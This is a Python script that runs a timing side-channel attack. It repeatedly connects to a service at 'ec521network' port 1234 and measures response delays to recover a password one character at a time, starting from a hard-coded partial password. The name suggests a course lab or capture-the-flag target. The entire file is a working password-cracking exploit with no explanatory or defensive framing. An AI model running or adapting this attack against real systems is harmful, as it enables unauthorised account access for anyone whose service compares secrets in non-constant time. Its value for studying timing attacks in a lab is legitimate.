import socket
import time
import string

def timing_attack():

    charset = ' ' + string.ascii_letters + string.digits + string.punctuation
    discovered_password = "B3W4R30fTC"

    try:
    

        
        for i in range(20):
            best_char = None
            max_time = 0

            for char in charset:
                test_input = discovered_password + char

                time.sleep(0.5)

                try:
                    # create tcp connection

                    # get prompt message
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(15)


                    s.connect(('ec521network', 1234))
                    res = s.recv(1024).decode()

                    start_time = time.time()
                    s.sendall((test_input + "\n").encode())

                    res = s.recv(1024).decode()
                    end_time = time.time()

                    print(char, end_time - start_time)


                    if (end_time - start_time) > max_time:
                        # if we took longer with previouschar + character, then we know its right
                        max_time = end_time - start_time
                        best_char = char


                except Exception as e:
                    print(e)
                finally:
                    s.close()
                    
            
            discovered_password += best_char
            print("Password so far:", discovered_password)

            try:
                # res = s.recv(1024).decode()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(10)

                s.connect(('ec521network', 1234))
                res = s.recv(1024).decode()
                s.sendall((discovered_password + "\n").encode())
                res = s.recv(1024).decode()
                print(res)
                # check if correct
                if "Error" not in res:
                    print("Password Found:", discovered_password)
                    s.close()
                    return discovered_password
                
            except Exception as e:
                print(e)
            finally:
                s.close()
    except Exception as e:
        print(e)

    return discovered_password


print(timing_attack())